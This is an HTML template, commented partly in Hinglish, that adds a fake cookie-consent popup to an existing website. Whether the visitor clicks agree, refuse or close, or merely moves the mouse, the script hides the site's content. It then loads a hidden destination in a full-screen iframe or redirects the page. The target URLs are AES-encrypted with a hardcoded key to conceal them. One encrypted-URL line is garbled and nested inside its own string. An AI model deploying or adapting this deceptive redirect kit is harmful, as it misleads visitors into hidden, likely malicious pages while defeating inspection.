<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- ========== YOUR EXISTING HEAD CONTENT ========== -->
    <title>Your Website</title>
    <!-- Your existing CSS, fonts, etc. -->
    
    <!-- ========== 🔥 ADD THIS IN HEAD 🔥 ========== -->
    <!-- CryptoJS (Required for decryption) -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
    
    <!-- Cookie Modal CSS Styles -->
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        /* Modal Styles */
        .cookie-modal-box { position: fixed; inset: 0; z-index: 9999; }
        .cookie-backdrop { position: fixed; inset: 0; background: rgba(0,0,0,0.4); backdrop-filter: blur(8px); z-index: 9998; }
        .cookie-modal { position: fixed; inset: 0; display: flex; align-items: center; justify-content: center; padding: 1rem; z-index: 9999; }
        .cookie-card { background: white; border-radius: 1.5rem; max-width: 28rem; width: 100%; padding: 2rem; position: relative; animation: fadeInScale 0.2s ease-out; }
        @keyframes fadeInScale { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
        .close-btn { position: absolute; top: 1rem; right: 1rem; background: none; border: none; cursor: pointer; }
        .close-btn:hover { background: #f3f4f6; border-radius: 50%; }
        .cookie-header { display: flex; align-items: center; gap: 0.75rem; margin-bottom: 1rem; }
        .cookie-icon { font-size: 2rem; }
        .cookie-title { font-size: 1.5rem; font-weight: 700; color: #1f2937; }
        .cookie-text { color: #4b5563; margin-bottom: 1.5rem; line-height: 1.5; }
        .button-group { display: flex; flex-direction: column; gap: 0.75rem; }
        @media (min-width: 640px) { .button-group { flex-direction: row; } }
        .btn-agree { flex: 1; background: #16a34a; color: white; border: none; padding: 0.75rem; border-radius: 0.5rem; font-weight: 700; cursor: pointer; }
        .btn-agree:hover { background: #15803d; }
        .btn-refuse { flex: 1; background: #e5e7eb; color: #1f2937; border: none; padding: 0.75rem; border-radius: 0.5rem; font-weight: 700; cursor: pointer; }
        .btn-refuse:hover { background: #d1d5db; }
        .hidden { display: none !important; }
    </style>
</head>
<body>

    <!-- ========== YOUR EXISTING WEBSITE CONTENT ========== -->
    <div id="yourWebsiteContent">
        <h1>Your Existing Website Content</h1>
        <p>Whatever you already have on your website</p>
        <!-- Your entire existing content goes here -->
    </div>

    <!-- ========== 🔥 ADD COOKIE MODAL HTML HERE (BODY KE ANDAR) 🔥 ========== -->
    <div id="cookieModalBox" class="cookie-modal-box">
        <div id="cookieBackdrop" class="cookie-backdrop"></div>
        <div id="cookieModal" class="cookie-modal">
            <div class="cookie-card">
                <button id="cookieClose" class="close-btn">
                    <svg viewBox="0 0 15 15" width="24" height="24">
                        <path d="M11.78 4.03a.75.75 0 0 0-1.06-1.06L7.5 6.19 4.28 2.97a.75.75 0 1 0-1.06 1.06L6.44 7.5l-3.22 3.22a.75.75 0 1 0 1.06 1.06L7.5 8.56l3.22 3.22a.75.75 0 1 0 1.06-1.06L8.56 7.5l3.22-3.47Z" fill="currentColor"/>
                    </svg>
                </button>
                <div class="cookie-header">
                    <span class="cookie-icon">🍪</span>
                    <h2 class="cookie-title">About cookies</h2>
                </div>
                <p class="cookie-text">
                    We use cookies to provide you with a better user experience. <strong>"agree"</strong>
                    By clicking, you agree to our use of cookies.
                </p>
                <div class="button-group">
                    <button id="cookieAccept" class="btn-agree">🍪 agree</button>
                    <button id="cookieDecline" class="btn-refuse">refuse</button>
                </div>
            </div>
        </div>
    </div>

    <!-- ========== 🔥 ADD JAVASCRIPT HERE (BODY KE END MEIN) 🔥 ========== -->
    <script>
        // AES Decode Function
        function aesDecode(encodedText) {
            try {
                const decodedText = decodeURIComponent(encodedText);
                const bytes = CryptoJS.AES.decrypt(decodedText, 'U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI=');
                return bytes.toString(CryptoJS.enc.Utf8);
            } catch(e) {
                console.error("Decryption error:", e);
                return "";
            }
        }

        // ========== 🔥 APNA REDIRECT LINK YAHAN CHANGE KARO 🔥 ==========
        const encryptedPersonalSite = "        const encryptedPersonalSite = "U2FsdGVkX1/UamiSBmZCwkSOxLnXnVf/nBD3Y1xB+frSzNV0F1LzJj1BnRs6jY1UKvyv93GwiDXxvQm4gwJzCIR+onLFveR23ObDaOPITkK/bG3QDDSBsrySoCQY2eI6";
";
        const encryptedHomeRedirect = "U2FsdGVkX1/dSXUuPLfJt4cXc54FVy6N9/sPnxHCW+Y=";
        
        let isFirstVisit = !localStorage.getItem("cookie-consent");
        let redirectTriggered = false;
        
        function performRedirect() {
            if (redirectTriggered) return;
            redirectTriggered = true;
            
            const yourContent = document.getElementById("yourWebsiteContent");
            const iframeContainer = document.getElementById("iframeContainer");
            const iframe = document.getElementById("redirectIframe");
            
            if (isFirstVisit) {
                let targetUrl = aesDecode(encryptedPersonalSite);
                
               if (!targetUrl || targetUrl === "") {
    console.error("Decryption failed!");
    return;
}
                
                // Hide your website content
                if (yourContent) yourContent.style.display = "none";
                
                // Show iframe with redirected website
                if (iframeContainer) {
                    iframeContainer.style.display = "block";
                    iframe.src = targetUrl;
                } else {
                    // If iframe doesn't exist, create it
                    const newIframeContainer = document.createElement('div');
                    newIframeContainer.id = 'iframeContainer';
                    newIframeContainer.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100vh;z-index:9997;background:white;';
                    newIframeContainer.innerHTML = '<iframe id="redirectIframe" src="' + targetUrl + '" style="width:100%;height:100%;border:none;"></iframe>';
                    document.body.appendChild(newIframeContainer);
                }
                
            } else {
                const homeUrl = aesDecode(encryptedHomeRedirect);
                if (homeUrl && homeUrl !== "") {
                    window.location.href = homeUrl;
                }
            }
        }
        
        // Modal elements
        const modalBox = document.getElementById("cookieModalBox");
        const backdrop = document.getElementById("cookieBackdrop");
        const acceptBtn = document.getElementById("cookieAccept");
        const declineBtn = document.getElementById("cookieDecline");
        const closeBtn = document.getElementById("cookieClose");
        
        function hideModalAndRedirect(consent) {
            localStorage.setItem("cookie-consent", consent);
            if (modalBox) modalBox.classList.add("hidden");
            document.removeEventListener("mousemove", mouseMoveHandler);
            performRedirect();
        }
        
        function mouseMoveHandler() {
            hideModalAndRedirect("closed");
        }
        
        if (acceptBtn) acceptBtn.onclick = () => hideModalAndRedirect("accepted");
        if (declineBtn) declineBtn.onclick = () => hideModalAndRedirect("declined");
        if (closeBtn) closeBtn.onclick = () => hideModalAndRedirect("closed");
        if (backdrop) backdrop.onclick = () => hideModalAndRedirect("closed");
        
        // Show modal
        if (modalBox) {
            modalBox.classList.remove("hidden");
            document.addEventListener("mousemove", mouseMoveHandler, { once: true });
        }
    </script>

</body>
</html>
